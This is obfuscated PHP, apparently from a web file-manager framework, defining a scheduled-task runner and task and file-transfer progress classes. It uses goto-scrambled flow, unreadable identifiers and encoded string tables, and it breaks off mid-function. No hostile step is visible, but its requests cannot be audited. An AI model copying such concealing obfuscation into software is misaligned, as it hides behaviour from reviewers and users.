<?php
 goto aßùˆˆÆ; F’èˆË½´‚: define($_SERVER[ÍÓÖ€°å][0], $_SERVER[ÍÓÖ€°å][1]); $_SERVER[ÌˆŞó˜ªµ°] = explode($_SERVER[ÍÓÖ€°å][2], gzinflate(substr($_SERVER[ÍÓÖ€°å][3], 10, -8))); function Model($dßóÇÅŞ® = '', $eßƒ…ö´²˜ = '', $E¾Ÿ©ÀªÜ = '') { goto D—óÀ÷¶¹›; Dè³§Ÿ¨ô: return $Fø³Ò†„Ã™[$D×¥Ÿëöæì]; goto C«æØ’çì÷; fë²¨˜²Ì: if (isset($Fø³Ò†„Ã™[$D×¥Ÿëöæì])) { return $Fø³Ò†„Ã™[$D×¥Ÿëöæì]; } if ($dßóÇÅŞ®) { $dßóÇÅŞ® = strtoupper($dßóÇÅŞ®[0]) . substr($dßóÇÅŞ®, 1); $C¾ÒÈø‹Ô÷ = $dßóÇÅŞ® . $bµï¿ñ™Œ¯[1]; if (class_exists($C¾ÒÈø‹Ô÷)) { $Fø³Ò†„Ã™[$D×¥Ÿëöæì] = new $C¾ÒÈø‹Ô÷(); return $Fø³Ò†„Ã™[$D×¥Ÿëöæì]; } } $Fø³Ò†„Ã™[$D×¥Ÿëöæì] = new ModelBase($dßóÇÅŞ®, $eßƒ…ö´²˜, $E¾Ÿ©ÀªÜ); goto Dè³§Ÿ¨ô; D—óÀ÷¶¹›: $bµï¿ñ™Œ¯ =& $_SERVER[ÌˆŞó˜ªµ°]; static $Fø³Ò†„Ã™ = array(); $D×¥Ÿëöæì = strtolower($eßƒ…ö´²˜ . $bµï¿ñ™Œ¯[0] . $dßóÇÅŞ®); goto fë²¨˜²Ì; C«æØ’çì÷: } goto DÙ„•ø¿„™; F æ½‡ŒÓ¿: class AutoTask { public static function start() { goto Eİ«†¢ƒÎ; b¦¦óóùš: while (!0) { self::cacheClear(); if (self::valueGet($fŞ÷Œ´°¿†[437]) != $fŞ÷Œ´°¿†[367]) { self::valueSet($fŞ÷Œ´°¿†[1027], $fŞ÷Œ´°¿†[393]); self::log($fŞ÷Œ´°¿†[1031]); die; } self::valueSet($fŞ÷Œ´°¿†[1027], $fŞ÷Œ´°¿†[367]); self::valueSet($fŞ÷Œ´°¿†[1028], time()); self::taskRunAll(); sleep(self::valueGet($fŞ÷Œ´°¿†[1032])); } goto dÒ¦°ó’¯“; Eİ«†¢ƒÎ: $fŞ÷Œ´°¿† =& $_SERVER[ÍÓÖ€°å]; if (self::valueGet($fŞ÷Œ´°¿†[437]) != $fŞ÷Œ´°¿†[367]) { return; } if (self::valueGet($fŞ÷Œ´°¿†[1027]) == $fŞ÷Œ´°¿†[367]) { $BàÅÛ‘±¥â = self::valueGet($fŞ÷Œ´°¿†[1028]); if (time() - $BàÅÛ‘±¥â > 3600 * 2) { self::restart(); } return; } goto c±¡’ãŞÈŞ; c±¡’ãŞÈŞ: http_close(); self::valueSet($fŞ÷Œ´°¿†[1027], $fŞ÷Œ´°¿†[367]); Hook::bind($fŞ÷Œ´°¿†[1029], $fŞ÷Œ´°¿†[1030]); goto b¦¦óóùš; dÒ¦°ó’¯“: } public static function restart() { $BšâÎ‘Êó =& $_SERVER[ÍÓÖ€°å]; http_close(); self::valueSet($BšâÎ‘Êó[437], $BšâÎ‘Êó[393]); sleep(self::valueGet($BšâÎ‘Êó[1032]) + 5); self::valueSet($BšâÎ‘Êó[1027], $BšâÎ‘Êó[393]); self::valueSet($BšâÎ‘Êó[437], $BšâÎ‘Êó[367]); } public static function shutdownEvent() { $BŒ›²š Øù =& $_SERVER[ÍÓÖ€°å]; self::valueSet($BŒ›²š Øù[1027], $BŒ›²š Øù[393]); self::log($BŒ›²š Øù[1033]); } public static function config($Dó‘¸Ş¢‡¯, $B¬ƒÙ„é¼Ï) { $dñ¶Ü‡‰ò =& $_SERVER[ÍÓÖ€°å]; $fË”“ÁÙÈƒ = 20; $B¬ƒÙ„é¼Ï = intval($B¬ƒÙ„é¼Ï) <= $fË”“ÁÙÈƒ ? $fË”“ÁÙÈƒ : intval($B¬ƒÙ„é¼Ï); self::valueSet($dñ¶Ü‡‰ò[437], $Dó‘¸Ş¢‡¯); self::valueSet($dñ¶Ü‡‰ò[1032], $B¬ƒÙ„é¼Ï); } private static function taskRunAll() { $B‘™î©íğ =& $_SERVER[ÍÓÖ€°å]; $dÀÇé¥ËÍ = Model($B‘™î©íğ[1034])->listData(); $BØùù÷Ó›ò = count($dÀÇé¥ËÍ); for ($bÕ‡‡àìá = 0; $bÕ‡‡àìá < $BØùù÷Ó›ò; $bÕ‡‡àìá++) { $eä®œ­®ÃÒ = $dÀÇé¥ËÍ[$bÕ‡‡àìá]; if ($eä®œ­®ÃÒ[$B‘™î©íğ[1035]] != $B‘™î©íğ[367]) { continue; } if (!self::taskTimeCheck($eä®œ­®ÃÒ)) { continue; } self::taskRun($eä®œ­®ÃÒ); } } private static function taskTimeCheck($d§ïìÆ½”) { goto Eˆæ™”ĞŞ•; Eˆæ™”ĞŞ•: $f‡“Ó¶¹á =& $_SERVER[ÍÓÖ€°å]; $a¾ÒÅ¦é®Š = json_decode($d§ïìÆ½”[$f‡“Ó¶¹á[178]], !0); $E¬ËÄß¨› = intval($d§ïìÆ½”[$f‡“Ó¶¹á[1028]]); goto C›Éò£ã¼©; C›Éò£ã¼©: $F—¾ƒ¬í÷è = strtotime($f‡“Ó¶¹á[1036] . $a¾ÒÅ¦é®Š[$f‡“Ó¶¹á[1037]] . $f‡“Ó¶¹á[1038]) - strtotime($f‡“Ó¶¹á[1039]); $A†êàÒ‘Œ = time() - strtotime(date($f‡“Ó¶¹á[1040]) . $f‡“Ó¶¹á[1041]); $dµŒºê«ëº = $A†êàÒ‘Œ >= $F—¾ƒ¬í÷è && $A†êàÒ‘Œ <= $F—¾ƒ¬í÷è + 3600; goto A¬Çêõˆå“; A¬Çêõˆå“: switch ($a¾ÒÅ¦é®Š[$f‡“Ó¶¹á[29]]) { case $f‡“Ó¶¹á[1042]: if (time() - $E¬ËÄß¨› < 3600 * 24 * 30) { return !1; } if ($a¾ÒÅ¦é®Š[$f‡“Ó¶¹á[1042]] == date($f‡“Ó¶¹á[1043]) && $dµŒºê«ëº) { return !0; } break; case $f‡“Ó¶¹á[1044]: if (time() - $E¬ËÄß¨› < 3600 * 24 * 7) { return !1; } $dÏ«Ëæíƒƒ = date($f‡“Ó¶¹á[1045]) == 0 ? 7 : date($f‡“Ó¶¹á[1045]); if ($a¾ÒÅ¦é®Š[$f‡“Ó¶¹á[1044]] == $dÏ«Ëæíƒƒ && $dµŒºê«ëº) { return !0; } break; case $f‡“Ó¶¹á[1037]: if (time() - $E¬ËÄß¨› < 3600 * 24) { return !1; } if ($dµŒºê«ëº) { return !0; } break; case $f‡“Ó¶¹á[1046]: if (time() - $E¬ËÄß¨› >= floatval($a¾ÒÅ¦é®Š[$f‡“Ó¶¹á[1046]]) * 60) { return !0; } break; default: break; } return !1; goto DÔˆšœ§Ê; DÔˆšœ§Ê: } public static function taskRun($C¦› Şå¨Æ) { goto C¡ğ›å³Ÿ; bø«Ğ³Åó‡: Model($C‹‚‚¾óÇ[1051])->add(array($C‹‚‚¾óÇ[1052] => $C‹‚‚¾óÇ[33], $C‹‚‚¾óÇ[1053] => $C‹‚‚¾óÇ[393], $C‹‚‚¾óÇ[29] => $C‹‚‚¾óÇ[1054] . $C¦› Şå¨Æ[$C‹‚‚¾óÇ[357]], $C‹‚‚¾óÇ[1055] => json_encode(array($C‹‚‚¾óÇ[28] => $C¦› Şå¨Æ[$C‹‚‚¾óÇ[28]], $C‹‚‚¾óÇ[1056] => timeFloat() - $FöÊÜ®·Ÿ, $C‹‚‚¾óÇ[273] => $DˆÙÈÏ–ĞŞ)))); self::log($C‹‚‚¾óÇ[1057] . $C¦› Şå¨Æ[$C‹‚‚¾óÇ[357]] . $C‹‚‚¾óÇ[1058] . $DˆÙÈÏ–ĞŞ); return !0; goto dâÜ¢¶‹Ô; C¡ğ›å³Ÿ: $C‹‚‚¾óÇ =& $_SERVER[ÍÓÖ€°å]; self::log($C‹‚‚¾óÇ[1047] . $C¦› Şå¨Æ[$C‹‚‚¾óÇ[357]] . $C‹‚‚¾óÇ[1048] . $C¦› Şå¨Æ[$C‹‚‚¾óÇ[28]] . $C‹‚‚¾óÇ[1049] . $C¦› Şå¨Æ[$C‹‚‚¾óÇ[1050]]); Model($C‹‚‚¾óÇ[1034])->run($C¦› Şå¨Æ[$C‹‚‚¾óÇ[357]]); goto AƒÕßÄˆ”“; AƒÕßÄˆ”“: $FöÊÜ®·Ÿ = timeFloat(); $DˆÙÈÏ–ĞŞ = $C‹‚‚¾óÇ[33]; switch ($C¦› Şå¨Æ[$C‹‚‚¾óÇ[29]]) { case $C‹‚‚¾óÇ[287]: $a†¢Œ¨–î‰ = url_request($C¦› Şå¨Æ[$C‹‚‚¾óÇ[1050]], $C‹‚‚¾óÇ[211], !1, !1, !1, !1, 5); $DˆÙÈÏ–ĞŞ = strlen($a†¢Œ¨–î‰); break; case $C‹‚‚¾óÇ[210]: $DˆÙÈÏ–ĞŞ = Hook::apply($C¦› Şå¨Æ[$C‹‚‚¾óÇ[1050]]); default: break; } goto bø«Ğ³Åó‡; dâÜ¢¶‹Ô: } private static function valueGet($eË¾Â‚ˆŞ®) { $f¹ë±¶‡°² =& $_SERVER[ÍÓÖ€°å]; $E¸Ë¸ÛË = $f¹ë±¶‡°²[1059]; $E¿»ßÅÓëØ = Model($f¹ë±¶‡°²[1060])->get($eË¾Â‚ˆŞ®, $E¸Ë¸ÛË); if (is_null($E¿»ßÅÓëØ)) { Model($f¹ë±¶‡°²[1060])->set($f¹ë±¶‡°²[1032], 10, $E¸Ë¸ÛË); Model($f¹ë±¶‡°²[1060])->set($f¹ë±¶‡°²[437], $f¹ë±¶‡°²[367], $E¸Ë¸ÛË); Model($f¹ë±¶‡°²[1060])->set($f¹ë±¶‡°²[1027], $f¹ë±¶‡°²[393], $E¸Ë¸ÛË); $E¿»ßÅÓëØ = Model($f¹ë±¶‡°²[1060])->get($eË¾Â‚ˆŞ®, $E¸Ë¸ÛË); } return $E¿»ßÅÓëØ; } private static function valueSet($c‰—¢Ğ¬‰Š, $a‰­Ò‘Ö¬) { $a¸¯º†÷Ÿ =& $_SERVER[ÍÓÖ€°å]; return Model($a¸¯º†÷Ÿ[1060])->set($c‰—¢Ğ¬‰Š, $a‰­Ò‘Ö¬, $a¸¯º†÷Ÿ[1059]); } protected static function log($f‡ÆÈ¢à÷ç) { write_log($f‡ÆÈ¢à÷ç, $_SERVER[ÍÓÖ€°å][1061]); } private static function cacheClear() { $EšôëÂ£ =& $_SERVER[ÍÓÖ€°å]; $aØŞÒˆùÎ = Model($EšôëÂ£[1060])->cacheKey($EšôëÂ£[1059]); Cache::clearMemory($aØŞÒˆùÎ); } } class Task { const STATYS_STOP = "\163\164\x6f\160"; const STATYS_RUNNING = "\x72\165\x6e\156\151\x6e\147"; const STATYS_KILL = "\153\151\154\154"; public $task; public function __destruct() { $this->end(); } public function __construct($Dì×È™‘àš, $e“‹„Î½²Ö = '', $b½à¥õÛë = 0, $cºíåáÜŒ = '') { goto Fˆ‰íŠ¹ä‚; C‰í¦êø : Hook::bind($DœÍ²ªïø×[1029], array($this, $DœÍ²ªïø×[1073])); Hook::bind($DœÍ²ªïø×[1074], array($this, $DœÍ²ªïø×[1075])); $this->startAfter(); goto c‡Ûºî®£™; c‡Ûºî®£™: $this->task[$DœÍ²ªïø×[1070]] = timeFloat(); self::valueSet($this->task[$DœÍ²ªïø×[357]], $this->task); goto e¦†—Ï; Fˆ‰íŠ¹ä‚: $DœÍ²ªïø× =& $_SERVER[ÍÓÖ€°å]; if (self::get($Dì×È™‘àš)) { return; } $this->task = array($DœÍ²ªïø×[357] => $Dì×È™‘àš, $DœÍ²ªïø×[1062] => USER_ID, $DœÍ²ªïø×[968] => $cºíåáÜŒ, $DœÍ²ªïø×[29] => $e“‹„Î½²Ö, $DœÍ²ªïø×[1063] => $DœÍ²ªïø×[33], $DœÍ²ªïø×[1064] => $b½à¥õÛë, $DœÍ²ªïø×[1065] => 0, $DœÍ²ªïø×[1066] => 0, $DœÍ²ªïø×[1067] => 0, $DœÍ²ªïø×[1068] => timeFloat(), $DœÍ²ªïø×[1069] => 0, $DœÍ²ªïø×[1070] => 0, $DœÍ²ªïø×[1071] => 0, $DœÍ²ªïø×[1072] => 0, $DœÍ²ªïø×[437] => $DœÍ²ªïø×[1027]); goto C‰í¦êø ; e¦†—Ï: } public function end() { goto BƒÎ‚«ù¾°; b¬™Ìá‰Œò: $eãí¸„î = timeFloat() - $this->task[$eİ»«óËÖ™[1068]]; self::log($eİ»«óËÖ™[1076] . $this->task[$eİ»«óËÖ™[357]] . $eİ»«óËÖ™[1077] . $eãí¸„î . $eİ»«óËÖ™[1078]); Hook::unbind($eİ»«óËÖ™[1029], array($this, $eİ»«óËÖ™[1073])); goto AÜ²Â–ˆ²ƒ; BƒÎ‚«ù¾°: $eİ»«óËÖ™ =& $_SERVER[ÍÓÖ€°å]; if (!$this->task) { return; } if ($this->task[$eİ»«óËÖ™[1070]]) { self::valueSet($this->task[$eİ»«óËÖ™[357]], !1); } goto b¬™Ìá‰Œò; AÜ²Â–ˆ²ƒ: Hook::unbind($eİ»«óËÖ™[1074], array($this, $eİ»«óËÖ™[1075])); $this->endAfter(); $this->task = !1; goto aßÚÚ†ÅËõ; aßÚÚ†ÅËõ: } public function update($EÛĞ¸„ùæ¦ = 0) { goto F×ÙºÒœíƒ; dÙ¹Ì³×…í: self::cacheClear(); $D²ËÊ‚¬œ  = self::get($cÙè´Çöå·[$e¼å‡×‰é[357]]); $bØêæÛ‹ÇŸ = $D²ËÊ‚¬œ [$e¼å‡×‰é[437]]; goto CõÎª½å²»; cê¸ĞæØÜ: $cÙè´Çöå·[$e¼å‡×‰é[1070]] = timeFloat(); self::valueSet($cÙè´Çöå·[$e¼å‡×‰é[357]], $cÙè´Çöå·); goto Eáºéäİˆ¥; F×ÙºÒœíƒ: $e¼å‡×‰é =& $_SERVER[ÍÓÖ€°å]; $cÙè´Çöå· =& $this->task; if (!$cÙè´Çöå·) { return; } goto Dâã‘¾êĞ‚; f¹¸Ì•Àà: $this->updateAfter(); $CàÔÎƒĞÌ’ = 0.2; if (timeFloat() - $cÙè´Çöå·[$e¼å‡×‰é[1070]] < $CàÔÎƒĞÌ’) { return; } goto dÙ¹Ì³×…í; Dâã‘¾êĞ‚: $cÙè´Çöå·[$e¼å‡×‰é[1065]] += $EÛĞ¸„ùæ¦; $cÙè´Çöå·[$e¼å‡×‰é[1069]] = timeFloat(); if ($cÙè´Çöå·[$e¼å‡×‰é[1064]]) { $dáù®ïÅëœ = timeFloat() - $cÙè´Çöå·[$e¼å‡×‰é[1068]] - $cÙè´Çöå·[$e¼å‡×‰é[1071]]; $cÙè´Çöå·[$e¼å‡×‰é[1066]] = $cÙè´Çöå·[$e¼å‡×‰é[1065]] / $cÙè´Çöå·[$e¼å‡×‰é[1064]]; $cÙè´Çöå·[$e¼å‡×‰é[1067]] = $cÙè´Çöå·[$e¼å‡×‰é[1065]] / $dáù®ïÅëœ; if ($cÙè´Çöå·[$e¼å‡×‰é[1066]] > 0) { $cÙè´Çöå·[$e¼å‡×‰é[1072]] = $dáù®ïÅëœ * (1 - $cÙè´Çöå·[$e¼å‡×‰é[1066]]) / $cÙè´Çöå·[$e¼å‡×‰é[1066]]; } } goto f¹¸Ì•Àà; CõÎª½å²»: if ($bØêæÛ‹ÇŸ == self::STATYS_KILL) { $A ˆ£ŸßÍ = array($e¼å‡×‰é[1079] => LNG($e¼å‡×‰é[1080]), $e¼å‡×‰é[757] => !1); Cache::set($e¼å‡×‰é[1081] . $this->task[$e¼å‡×‰é[357]], $A ˆ£ŸßÍ, 30); $this->end(); die; } else { if ($bØêæÛ‹ÇŸ == self::STATYS_STOP) { $e™ˆÒô­Àë = 2; $D²ËÊ‚¬œ [$e¼å‡×‰é[1071]] += $e™ˆÒô­Àë; self::valueSet($cÙè´Çöå·[$e¼å‡×‰é[357]], $D²ËÊ‚¬œ ); sleep($e™ˆÒô­Àë); $this->update(); return; } } $cÙè´Çöå·[$e¼å‡×‰é[437]] = $bØêæÛ‹ÇŸ ? $bØêæÛ‹ÇŸ : $cÙè´Çöå·[$e¼å‡×‰é[437]]; $cÙè´Çöå·[$e¼å‡×‰é[1071]] = $D²ËÊ‚¬œ [$e¼å‡×‰é[1071]] ? $D²ËÊ‚¬œ [$e¼å‡×‰é[1071]] : 0; goto cê¸ĞæØÜ; Eáºéäİˆ¥: } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($a¢®Ñöè‘») { $D×ãŒ‚îÕ =& $_SERVER[ÍÓÖ€°å]; Cache::set($D×ãŒ‚îÕ[1081] . $this->task[$D×ãŒ‚îÕ[357]], $a¢®Ñöè‘», 30); return $a¢®Ñöè‘»; } public static function get($dë ¥š©) { return self::valueGet($dë ¥š©); } public static function listData($e²õ«É£±Ó = false) { $d¶ÏÇô¡Ö =& $_SERVER[ÍÓÖ€°å]; $cÔ¢Ìö‘à† = self::valueGet(); if ($e²õ«É£±Ó) { $cÔ¢Ìö‘à† = array_filter_by_field($cÔ¢Ìö‘à†, $d¶ÏÇô¡Ö[1062], $e²õ«É£±Ó); } $cÔ¢Ìö‘à† = array_sort_by($cÔ¢Ìö‘à†, $d¶ÏÇô¡Ö[1068], !0); return $cÔ¢Ìö‘à†; } public static function kill($bÀ™ŠÜÕ œ) { return self::changeStatus($bÀ™ŠÜÕ œ, self::STATYS_KILL); } public static function stop($EšÎ¾‚®ÃÓ) { return self::changeStatus($EšÎ¾‚®ÃÓ, self::STATYS_STOP); } public static function restart($Fƒ‰õÒÎ) { return self::changeStatus($Fƒ‰õÒÎ, self::STATYS_RUNNING); } public static function killAll() { $c±îİË =& $_SERVER[ÍÓÖ€°å]; $Cº®«à£Îç = self::listData(); foreach ($Cº®«à£Îç as $D–Ÿ†¹˜öê) { self::kill($D–Ÿ†¹˜öê[$c±îİË[357]]); } sleep(2); foreach ($Cº®«à£Îç as $D–Ÿ†¹˜öê) { self::valueSet($D–Ÿ†¹˜öê[$c±îİË[357]], !1); } } private static function changeStatus($fÆ•ˆÊ»Ä¾, $f¶çö‘µ²‰) { goto B­‰šé…; B­‰šé…: $CŠá·‹åñ‚ =& $_SERVER[ÍÓÖ€°å]; $C´Ì¢²íªÅ = self::valueGet($fÆ•ˆÊ»Ä¾); if (!$C´Ì¢²íªÅ) { return !1; } goto EÊ•‚Öóáƒ; EÊ•‚Öóáƒ: $C´Ì¢²íªÅ[$CŠá·‹åñ‚[437]] = $f¶çö‘µ²‰; self::valueSet($fÆ•ˆÊ»Ä¾, $C´Ì¢²íªÅ); self::log($CŠá·‹åñ‚[1082] . $C´Ì¢²íªÅ[$CŠá·‹åñ‚[357]] . $CŠá·‹åñ‚[1083] . $f¶çö‘µ²‰); goto c÷†£—ìƒ; c÷†£—ìƒ: return !0; goto Fº´¦Ò±½ß; Fº´¦Ò±½ß: } public static function valueGet($e‰öÕ’•Š = false) { $cÒˆø´¥ò¾ =& $_SERVER[ÍÓÖ€°å]; $cØÚæ¿¼®Ô = $cÒˆø´¥ò¾[1084]; $A“ŠßĞÎ = Model($cÒˆø´¥ò¾[1060])->get($e‰öÕ’•Š, $cØÚæ¿¼®Ô); if ($e‰öÕ’•Š) { $A“ŠßĞÎ = $A“ŠßĞÎ ? json_decode($A“ŠßĞÎ, !0) : !1; } else { $A“ŠßĞÎ = $A“ŠßĞÎ ? $A“ŠßĞÎ : array(); foreach ($A“ŠßĞÎ as $dÃ¼›´Û‘³ => $e‘¬¤Ÿâß‡) { $A“ŠßĞÎ[$dÃ¼›´Û‘³] = json_decode($e‘¬¤Ÿâß‡, !0); } } return $A“ŠßĞÎ; } public static function valueSet($BâÆƒ×§, $D…·„»øÆò) { goto A§ˆ©®¥õ; FÖ”ˆ¿³ò¬: $fòé—Ü½¦† = json_encode($D…·„»øÆò); if (!$fòé—Ü½¦†) { ob_start(); var_dump($D…·„»øÆò); $aÑ¡Óøå— = ob_get_clean(); self::log($aªË¢¥Š¶«[1085] . json_encode_force($aÑ¡Óøå—)); } if (!$BâÆƒ×§ || !$D…·„»øÆò[$aªË¢¥Š¶«[357]]) { return !1; } goto bµùÕ‚ÆÜ½; bµùÕ‚ÆÜ½: return Model($aªË¢¥Š¶«[1060])->set($BâÆƒ×§, $fòé—Ü½¦†, $Bâ¼èğ); goto f×Ûí‹‡‹; A§ˆ©®¥õ: $aªË¢¥Š¶« =& $_SERVER[ÍÓÖ€°å]; $Bâ¼èğ = $aªË¢¥Š¶«[1084]; if (!$D…·„»øÆò) { return Model($aªË¢¥Š¶«[1060])->remove($BâÆƒ×§, $Bâ¼èğ); } goto FÖ”ˆ¿³ò¬; f×Ûí‹‡‹: } public static function cacheClear() { $cîò†ª¤Ä =& $_SERVER[ÍÓÖ€°å]; $b¥×ÑÒ¦äš = Model($cîò†ª¤Ä[1060])->cacheKey($cîò†ª¤Ä[1084]); Cache::clearMemory($b¥×ÑÒ¦äš); } public static function log($d›²ôÂ–¡) { write_log($d›²ôÂ–¡, $_SERVER[ÍÓÖ€°å][1086]); } } class TaskFileTransfer extends Task { protected function startAfter() { goto Aãôğµ×ó; C×ºğùŞ‘: Hook::bind($AÂŞ¾ºà»[1087], array($this, $AÂŞ¾ºà»[1088])); Hook::bind($AÂŞ¾ºà»[1089], array($this, $AÂŞ¾ºà»[1090])); Hook::bind($AÂŞ¾ºà»[413], array($this, $AÂŞ¾ºà»[1091])); goto B¢ØëßğÅÑ; f„äÅ³î‘¾: if (!$CæèÊºí‰“[$AÂŞ¾ºà»[968]]) { $CæèÊºí‰“[$AÂŞ¾ºà»[968]] = LNG($AÂŞ¾ºà»[1106]); } goto dò·‘“Âˆò; C×ÇÙã‰¶: $CæèÊºí‰“[$AÂŞ¾ºà»[1063]] = $AÂŞ¾ºà»[33]; $CæèÊºí‰“[$AÂŞ¾ºà»[1104]] = $AÂŞ¾ºà»[33]; $CæèÊºí‰“[$AÂŞ¾ºà»[1105]] = 0; goto f„äÅ³î‘¾; Aº‡¥ÂÔö: $CæèÊºí‰“[$AÂŞ¾ºà»[1100]] = LNG($AÂŞ¾ºà»[1101]); $CæèÊºí‰“[$AÂŞ¾ºà»[1102]] = 0; $CæèÊºí‰“[$AÂŞ¾ºà»[1103]] = 0; goto C×ÇÙã‰¶; Aãôğµ×ó: $AÂŞ¾ºà» =& $_SERVER[ÍÓÖ€°å]; $CæèÊºí‰“ =& $this->task; $this->sourceCopyFolder = !1; goto C×ºğùŞ‘; B¢ØëßğÅÑ: Hook::bind($AÂŞ¾ºà»[414], array($this, $AÂŞ¾ºà»[1092])); Hook::bind($AÂŞ¾ºà»[416], array($this, $AÂŞ¾ºà»[1093])); Hook::bind($AÂŞ¾ºà»[417], array($this, $AÂŞ¾ºà»[1093])); goto eÛêÃ©‹‚; eÛêÃ©‹‚: Hook::bind($AÂŞ¾ºà»[1094], array($this, $AÂŞ¾ºà»[1095])); Hook::bind($AÂŞ¾ºà»[1096], array($this, $AÂŞ¾ºà»[1097])); Hook::bind($AÂŞ¾ºà»[1098], array($this, $AÂŞ¾ºà»[1099])); goto Aº‡¥ÂÔö; dò·‘“Âˆò: } protected function endAfter() { $aºÑ§²¸ˆÀ =& $_SERVER[ÍÓÖ€°å]; Hook::unbind($aºÑ§²¸ˆÀ[1087], array($this, $aºÑ§²¸ˆÀ[1088])); Hook::unbind($aºÑ§²¸ˆÀ[1089], array($this, $aºÑ§²¸ˆÀ[1090])); Hook::unbind($aºÑ§²¸ˆÀ[1094], array($this, $aºÑ§²¸ˆÀ[1095])); Hook::unbind($aºÑ§²¸ˆÀ[1096], array($this, $aºÑ§²¸ˆÀ[1097])); Hook::unbind($aºÑ§²¸ˆÀ[1098], array($this, $aºÑ§²¸ˆÀ[1099])); } public function updateAfter() { goto aÍµªè……Õ; FÖÖßËì‡§: $dĞÊóµÔ²Œ = 0; if ($c¬ğ˜‹®Ü´[$A›»Šì­½[1104]] == $A›»Šì­½[765]) { $dĞÊóµÔ²Œ = $c¬ğ˜‹®Ü´[$A›»Šì­½[1103]] * 0.5; } else { if ($c¬ğ˜‹®Ü´[$A›»Šì­½[1104]] == $A›»Šì­½[126]) { $dĞÊóµÔ²Œ = $c¬ğ˜‹®Ü´[$A›»Šì­½[1103]] * 0.5 + $c¬ğ˜‹®Ü´[$A›»Šì­½[1102]] * 0.5; } } $c¬ğ˜‹®Ü´[$A›»Šì­½[1066]] = ($c¬ğ˜‹®Ü´[$A›»Šì­½[1107]] + $dĞÊóµÔ²Œ) / $c¬ğ˜‹®Ü´[$A›»Šì­½[446]]; goto F¶ŸĞìÃğ; F¶ŸĞìÃğ: if ($c¬ğ˜‹®Ü´[$A›»Šì­½[1066]] > 0) { $F¸èÚ‡Ëœ = timeFloat() - $c¬ğ˜‹®Ü´[$A›»Šì­½[1068]] - $c¬ğ˜‹®Ü´[$A›»Šì­½[1071]]; $c¬ğ˜‹®Ü´[$A›»Šì­½[1072]] = $F¸èÚ‡Ëœ * (1 - $c¬ğ˜‹®Ü´[$A›»Šì­½[1066]]) / $c¬ğ˜‹®Ü´[$A›»Šì­½[1066]]; } goto e¶‘³ñ®ÑÂ; aÍµªè……Õ: $A›»Šì­½ =& $_SERVER[ÍÓÖ€°å]; $c¬ğ˜‹®Ü´ =& $this->task; if (!$c¬ğ˜‹®Ü´[$A›»Šì­½[446]]) { return; } goto FÖÖßËì‡§; e¶‘³ñ®ÑÂ: } public function addPath($cšô¾–„æÑ) { goto FÊŠ‡éÌãì; FÊŠ‡éÌãì: $dß††‹²ŒÏ =& $_SERVER[ÍÓÖ€°å]; $cé»êÅÎÖ =& $this->task; $dÄª´ŸÕ…‹ = IO::infoWithChildren($cšô¾–„æÑ); goto d¸º…Òè¨¼; d¸º…Òè¨¼: if (!$cé»êÅÎÖ[$dß††‹²ŒÏ[1108]]) { $cé»êÅÎÖ[$dß††‹²ŒÏ[1108]] = array(); } $cé»êÅÎÖ[$dß††‹²ŒÏ[1108]][] = array($dß††‹²ŒÏ[378] => $dÄª´ŸÕ…‹[$dß††‹²ŒÏ[28]], $dß††‹²ŒÏ[76] => $dÄª´ŸÕ…‹[$dß††‹²ŒÏ[76]], $dß††‹²ŒÏ[750] => $dÄª´ŸÕ…‹[$dß††‹²ŒÏ[750]] ? $dÄª´ŸÕ…‹[$dß††‹²ŒÏ[750]] : $dÄª´ŸÕ…‹[$dß††‹²ŒÏ[76]]); if ($dÄª´ŸÕ…‹[$dß††‹²ŒÏ[29]] == $dß††‹²ŒÏ[155]) { $cé»êÅÎÖ[$dß††‹²ŒÏ[1064]] += 1; } else { $cé»êÅÎÖ[$dß††‹²ŒÏ[1064]] += $dÄª´ŸÕ…‹[$dß††‹²ŒÏ[81]][$dß††‹²ŒÏ[79]]; } goto e§ÎÏÚ´¸; e§ÎÏÚ´¸: $cé»êÅÎÖ[$dß††‹²ŒÏ[446]] += $dÄª´ŸÕ…‹[$dß††‹²ŒÏ[78]]; $this->update(); goto aœÂ°·°«£; aœÂ°·°«£: } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddFile($d¡Ø„óç“) { $dª¹ßÁ‡¡ =& $_SERVER[ÍÓÖ€°å]; $FÑ‹”ÂÕáß =& $this->task; $FÑ‹”ÂÕáß[$dª¹ßÁ‡¡[1100]] = $d¡Ø„óç“[$dª¹ßÁ‡¡[28]]; $FÑ‹”ÂÕáß[$dª¹ßÁ‡¡[1063]] = $d¡Ø„óç“[$dª¹ßÁ‡¡[28]]; $this->update(); } public function copyFileStart($aŠß¬ôô»¼, $dÇé¥ ´æÌ, $dâ½ë¿’Ç†, $bĞ¼•¿‰³±, $Cˆ¼ŠœÜŒ, $e’ò­â²ßŸ) { goto BÒó“î¿÷; e£Ó¤ä½Õæ: $GLOBALS[$dãÄ—·Æ…¦[1110]] = $Cˆ¼ŠœÜŒ; $GLOBALS[$dãÄ—·Æ…¦[1109]] = $e’ò­â²ßŸ; $CŠÊĞá…ØÎ =& $this->task; goto dõ‚°”Á˜; föÁá–»Ä : $CŠÊĞá…ØÎ[$dãÄ—·Æ…¦[1063]] = $dãÄ—·Æ…¦[33]; $CŠÊĞá…ØÎ[$dãÄ—·Æ…¦[1104]] = $dãÄ—·Æ…¦[33]; $CŠÊĞá…ØÎ[$dãÄ—·Æ…¦[1105]] = 0; goto E›Ñ¹† øø; E›Ñ¹† øø: $this->update(); goto b‡èä½ôÓ; BÒó“î¿÷: $dãÄ—·Æ…¦ =& $_SERVER[ÍÓÖ€°å]; $cŠ´‡ˆ›Ò• = $Cˆ¼ŠœÜŒ; if ($cŠ´‡ˆ›Ò• == $GLOBALS[$dãÄ—·Æ…¦[1109]]) { $cŠ´‡ˆ›Ò• = $GLOBALS[$dãÄ—·Æ…¦[1110]]; } goto e£Ó¤ä½Õæ; dõ‚°”Á˜: $CŠÊĞá…ØÎ[$dãÄ—·Æ…¦[1100]] = $cŠ´‡ˆ›Ò•; $CŠÊĞá…ØÎ[$dãÄ—·Æ…¦[1102]] = (int) $aŠß¬ôô»¼->size($dÇé¥ ´æÌ); $CŠÊĞá…ØÎ[$dãÄ—·Æ…¦[1103]] = 0; goto föÁá–»Ä ; b‡èä½ôÓ: } public function copyFileEnd($DîÅñ†¦¡£, $b—¯Ó¾×¶¯, $bññİÂ„ãè, $f±æŒ°©», $d³‹æ•å›°, $f´··ìç«Ì) { $f¡Çö¹…‘Ì =& 